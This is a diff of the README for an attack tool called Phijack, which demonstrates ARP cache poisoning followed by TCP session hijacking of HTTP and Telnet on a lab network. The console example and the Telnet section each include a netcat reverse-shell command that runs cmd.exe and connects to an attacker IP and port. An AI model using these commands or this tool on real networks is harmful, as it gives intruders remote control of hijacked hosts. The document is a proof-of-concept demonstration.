@@ -1,20 +1,45 @@
-# TCP Hijacking
+# Phijack
 
-The attack is carried out in two stages.
+![Phijack](img/phijack.png)
 
-1. Man in the Middle attack using **ARP poisoning**. This allows the attacker to sniff the traffic and obtain the TCP SEQ and ACK numbers.
+## An Attack Tool for TCP Session Hijacking
 
-2. Higher-layer protocol attack through **TCP session hijacking**. For instance, unencrypted application layer protocols such as Telnet, FTP and HTTP.
+The Transmission Control Protocol (TCP) is one of the main protocols of the Internet Protocol (IP) suite. As a transport-layer protocol, it allows applications to communicate with each other over a network. The connection-oriented nature of TCP leads to potential vulnerabilities when an attacker gains unauthorized access to an established session. Using Scapy, a tool was created to demonstrate TCP session hijacking attacks over a network. We demonstrate a man-in-the-middle attack through ARP cache poisoning, which is followed up by TCP session hijacking to attack unencrypted application-layer protocols. We present two proof-of-concept attacks: website spoofing through hijacking the HTTP protocol, and remote code execution through hijacking the Telnet protocol.
 
-The tool is split into two modules: `arp_poisoning.py` and `tcp_hijacking.py`.
+## Interface
 
-The ARP Poisoning module provides auxiliary features like host discovery and traffic sniffing.
+`phijack.py` provides an interactive console. To view attack options, use the `SHOW OPTIONS` command. The default attack is a host discovery ARP scan. The two basic parameters, `IFACE` and `ATTACK`, are always required. The attack-specific parameters are listed under Attack Parameters.
 
-The attacker may want to conduct a TCP hijacking attack. In this case, the TCP Hijacking module is used.
+For instance, the following configures a Telnet session hijacking attack:
 
-# Proof of Concept
+```
+[Phijack] > SET ATTACK HIJACK
+ATTACK => hijack
 
-## Discovery
+[Phijack] > SET IFACE eth1
+IFACE => eth1
+
+[Phijack] > SET TARGET 192.168.99.1
+TARGET => 192.168.99.1
+
+[Phijack] > SET GATEWAY 192.168.99.102
+GATEWAY => 192.168.99.102
+
+[Phijack] > SET PROTO telnet
+PROTO => telnet
+
+[Phijack] > SET CMD nc -e cmd.exe 192.168.99.101 1337
+CMD => nc -e cmd.exe 192.168.99.101 1337
+
+[Phijack] > RUN
+...
+```
+
+Alternatively, the `arp_poisoning.py` and `tcp_hijacking.py` modules take in command-line parameters.
+
+## Proof of Concept
+
+### Discovery
 
 The following command can be used to discover hosts on the network using an ARP scan.
 
@@ -22,7 +47,7 @@ The following command can be used to discover hosts on the network using an ARP 
 
 ![ARP Scan](img/arp_scan.png)
 
-## ARP Poisoning
+### ARP Poisoning
 
 Provide the victim IP and the gateway IP.
 
@@ -34,13 +59,13 @@ All the subsequent attacks rely on first achieving a man-in-the-middle attack vi
 
 ![ARP Table Before and After](img/arp_spoofed.png)
 
-## HTTP Session Hijacking
+### HTTP Session Hijacking
 
-The attacker returns an arbitrary webpage (poc.html) when the victim sends a HTTP GET request.
+The attacker returns an arbitrary webpage (`poc.html`) when the victim sends a HTTP GET request.
 
-The legit website hosted on port 80:
+The legitimate website hosted on port 80:
 
-![Legit Website](img/legit_website.png)
+![Legitimate Website](img/legit_website.png)
 
 Script output:
 
@@ -50,7 +75,7 @@ After successful attack, the victim sees the attacker's website instead:
 
 ![Attacker Website](img/spoofed_site.png)
 
-## Telnet Session Hijacking
+### Telnet Session Hijacking
 
 The attacker hijacks an established Telnet session to execute arbitrary commands. For example, the following executes `nc -e cmd.exe 192.168.213.223 4444`, giving the attacker a reverse shell into the Telnet server.
 
